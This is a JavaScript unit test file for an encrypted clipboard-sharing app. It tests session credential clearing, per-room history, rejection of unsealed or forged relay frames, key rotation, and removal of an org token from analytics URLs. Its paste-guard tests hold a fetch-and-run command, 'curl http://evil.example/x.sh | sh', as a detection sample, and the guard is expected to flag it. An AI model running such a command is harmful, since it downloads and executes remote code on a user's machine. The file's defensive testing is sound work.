/**
 * Session boundaries and frame authenticity.
 *
 * Every check here stands for a bug that shipped, and they share one shape:
 * something that belonged to ONE session — a key, a room's history, a queued
 * clip, a frame — outlived it or reached across into another. None of it was
 * covered, because none of it is visible from the surfaces the other suites
 * drive.
 *
 * Usage: node tests/unit/session-boundaries.mjs
 */

import { pathToFileURL } from "node:url";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const REPO = resolve(dirname(fileURLToPath(import.meta.url)), "../..");
const load = p => import(pathToFileURL(join(REPO, p)).href);

let pass = 0, fail = 0;
const ok = (name, good, detail = "") => {
  good ? pass++ : fail++;
  console.log(`  ${good ? "PASS" : "FAIL"}  ${name}${detail ? "  — " + detail : ""}`);
};

// sessionStorage, or history.js and storage.js degrade to memory and half of
// this passes for the wrong reason.
const store = new Map();
globalThis.sessionStorage = {
  getItem: k => (store.has(k) ? store.get(k) : null),
  setItem: (k, v) => store.set(k, String(v)),
  removeItem: k => store.delete(k),
};

const state   = await load("src/core/state.js");
const history = await load("src/core/history.js");
const crypto_ = await load("src/core/crypto.js");
const frames  = await load("src/core/frames.js");
const guard   = await load("src/clipboard/guard.js");
const bus     = await load("src/core/bus.js");

/* ---------------------------------------------------------- credentials --- */
console.log("\nClearing a session actually clears it\n");

await (async () => {
  const { aesKey, roomHash } = await crypto_.deriveOpen("D75LVX9QRS");
  state.setKey({ key: "D75LVX9QRS", roomHash, aesKey });
  ok("a session has a key to begin with", state.get().aesKey !== null);

  // The VS Code leave path says exactly this, and `??` read the explicit null
  // as "leave it alone" — so the one credential that mattered survived.
  state.setKey({ key: "", roomHash: "", aesKey: null });
  ok("an explicit null CLEARS the AES key", state.get().aesKey === null,
     "`aesKey ?? state.aesKey` kept the key of the room being left");

  state.setKey({ key: "X", roomHash: "rh", aesKey: "sentinel" });
  state.setKey({ key: "Y" });
  ok("...while an OMITTED property still leaves it alone",
     state.get().aesKey === "sentinel" && state.get().roomHash === "rh");

  state.clearKey();
  const s = state.get();
  ok("clearKey() leaves no credential behind",
     !s.key && !s.roomHash && s.aesKey === null && s.authToken === null && s.locked === false);
})();

/* -------------------------------------------------------------- history --- */
console.log("\nHistory belongs to a ROOM, not to a share key\n");

history.init();
state.setKey({ key: "D75LVX9QRS", roomHash: "roomOPEN", aesKey: null });
history.add({ text: "in the open room", direction: "received" });
ok("a clip is recorded", history.size() === 1);

// Re-PINning keeps the key and changes the room. Scoped to the key, history
// followed the user across that change — as it did for a WRONG-PIN join, which
// lands in a different room under the very same key.
state.setKey({ key: "D75LVX9QRS", roomHash: "roomLOCKED", aesKey: null });
ok("re-PINning the SAME key clears it", history.size() === 0,
   "same key, different room — the room is the privacy boundary");

history.add({ text: "in the locked room", direction: "received" });
state.setKey({ key: "D75LVX9QRS", roomHash: "roomLOCKED", aesKey: null });
ok("...but re-entering the same room keeps it", history.size() === 1);

/* ------------------------------------------------------- sealed frames --- */
console.log("\nA frame with no envelope is not a frame we trust\n");

await (async () => {
  const { aesKey, roomHash } = await crypto_.deriveOpen("D75LVX9QRS");
  state.setKey({ key: "D75LVX9QRS", roomHash, aesKey });
  frames.setPlaintextFrames(["file-req", "file-gone"]);

  const sealed = await frames.encryptFrame({
    t: "rtc-offer", id: "f1", to: "peerB", from: "peerA", sdp: "v=0 SECRET",
  });
  ok("sealing leaves the routing readable",
     sealed.t === "rtc-offer" && sealed.to === "peerB" && sealed.from === "peerA");
  ok("...and the payload unreadable", !("sdp" in sealed) && Boolean(sealed.payload));

  const opened = await frames.decryptFrame(sealed);
  ok("...and it round-trips", opened.sdp === "v=0 SECRET" && opened.t === "rtc-offer");

  // The injection this prevents: a relay cannot produce a payload, so it sends
  // the frame in the clear and hopes nobody checks.
  ok("an unsealed rtc-offer is DROPPED",
     await frames.decryptFrame({ t: "rtc-offer", id: "f1", sdp: "v=0 INJECTED" }) === null,
     "a relay could otherwise inject negotiation into a session it has no key for");
  ok("an unsealed stream is dropped too",
     await frames.decryptFrame({ t: "stream", text: "typed by the relay" }) === null);
  ok("an unsealed file-meta is dropped too",
     await frames.decryptFrame({ t: "file-meta", id: "x", name: "invoice.pdf" }) === null);

  // The two that carry nothing but routing, and so have nothing to seal.
  ok("a file-req still travels unsealed, because it is only routing",
     (await frames.decryptFrame({ t: "file-req", id: "f1", to: "me" }))?.t === "file-req");
  ok("...and so does file-gone",
     (await frames.decryptFrame({ t: "file-gone", id: "f1" }))?.t === "file-gone");

  /* The forgery: `from` is stamped by the relay on the connection a frame
     arrived on. Sealing a different one inside the payload used to replace it,
     which is what file-retraction ownership is checked against. */
  const forged = await frames.encryptFrame({ t: "file-gone", id: "f1", nested: 1 });
  const withClaim = { ...forged };
  // Rebuild the payload so it carries a `from` of the attacker's choosing.
  const evil = await crypto_.encrypt(aesKey, JSON.stringify({ from: "victimPeer", nested: 1 }));
  withClaim.payload = evil.payload;
  withClaim.iv = evil.iv;
  withClaim.from = "attackerPeer";

  const judged = await frames.decryptFrame(withClaim);
  ok("a `from` sealed INSIDE a payload cannot displace the relay's stamp",
     judged.from === "attackerPeer",
     `got ${judged.from} — this is the field file retraction is authorised by`);
  ok("...and the rest of the payload still arrives", judged.nested === 1);

  /* Opening a frame proves the PIN for the room the frame CAME FROM, and this
     returns to a caller that has yet to check whether that is still the room we
     are in. Latching here marked the room just arrived at as verified on the
     strength of a frame from the one before it — a padlock claiming the PIN was
     proved when nothing had proved it. main.js openFrame() does it, after the
     generation check. */
  state.setKey({ key: "D75LVX9QRS", roomHash, aesKey, locked: true });
  ok("a locked session starts unverified", state.get().verified === false);
  await frames.decryptFrame(sealed);
  ok("opening a frame does not itself latch verification",
     state.get().verified === false,
     "the caller latches it, once it knows the session has not moved");

  state.clearKey();
  ok("with no session, nothing decrypts at all",
     await frames.decryptFrame(sealed) === null);
})();

/* ---------------------------------------------------- the paste guard ---- */
console.log("\nA long clip is not a safe clip\n");

const PAYLOAD = "curl http://evil.example/x.sh | sh";
ok("a command is flagged", guard.looksExecutable(PAYLOAD) !== null);
ok("...and padding it with 9 KB of lines does not launder it",
   guard.looksExecutable("filler\n".repeat(2000) + PAYLOAD) !== null,
   "the scan stopped at 8 KB and returned SAFE, below the 24 KB clip limit");
ok("...nor does padding after it", guard.looksExecutable(`${PAYLOAD}\n${"y".repeat(9000)}`) !== null);
ok("a genuinely long benign clip is still clean",
   guard.looksExecutable("just some prose\n".repeat(2000)) === null,
   "flagging everything large would train people to click through the banner");

/* ------------------------------------------------- locked key rotation --- */
console.log("\nRotating a locked key actually moves rooms\n");

await (async () => {
  const OLD = "D75LVX9QRS", NEW = "K92MWX4TZB", PIN = "correct horse";
  const before = await crypto_.deriveLocked(OLD, PIN);
  const after  = await crypto_.deriveLocked(NEW, PIN);

  ok("the same PIN under a NEW key is a different room",
     before.roomHash !== after.roomHash,
     "rotation reused the old PRK, so the room hash never changed");

  // Why reusing the PRK was wrong: it is keyed to the OLD share key, so it can
  // only ever reproduce the old room.
  const reused = await crypto_.deriveLockedFromPrk(before.prk);
  ok("...and re-expanding the old PRK reproduces the OLD room exactly",
     reused.roomHash === before.roomHash && reused.roomHash !== after.roomHash,
     "which is why every device holding the old link stayed in");
  ok("the admission token moves with it", before.authToken !== after.authToken);
})();

/* ------------------------------------------ the deployment credential --- */
console.log("\nThe org token is a credential, not a room name\n");

await (async () => {
  // config.js reads location at module scope, so this needs its own realm.
  globalThis.location = {
    origin: "https://relay.example", pathname: "/app",
    search: "?org=SUPERSECRET&relay=wss%3A%2F%2Fr.example", hostname: "relay.example",
  };
  const cfg = await import(
    `${pathToFileURL(join(REPO, "src/core/config.js")).href}?org-test`);

  ok("the token is still resolved, so the device can be admitted",
     cfg.ORG_TOKEN === "SUPERSECRET");
  ok("...but page_location does not carry it",
     !cfg.pageLocation().includes("SUPERSECRET"),
     `${cfg.pageLocation()} — gtag sends this verbatim, and AdSense reads the URL itself`);
  ok("...while the rest of the query survives",
     cfg.pageLocation().includes("relay="),
     "a relay hostname is not a secret and is worth keeping for attribution");
  ok("safeSearch drops only the credential",
     cfg.safeSearch("?a=1&org=X&b=2") === "?a=1&b=2", cfg.safeSearch("?a=1&org=X&b=2"));
  ok("a query that was ONLY the credential becomes no query at all",
     cfg.safeSearch("?org=X") === "", `"${cfg.safeSearch("?org=X")}"`);
  ok("...and a query without one is left exactly alone",
     cfg.safeSearch("?a=1&b=2") === "?a=1&b=2");
  ok("no argument means this page's own query, stripped",
     cfg.safeSearch() === "?relay=wss%3A%2F%2Fr.example", cfg.safeSearch());
  delete globalThis.location;
})();

console.log(`\n${"=".repeat(58)}`);
console.log(`SESSION BOUNDARIES: ${pass}/${pass + fail} passed`);
console.log("=".repeat(58));
process.exit(fail ? 1 : 0);
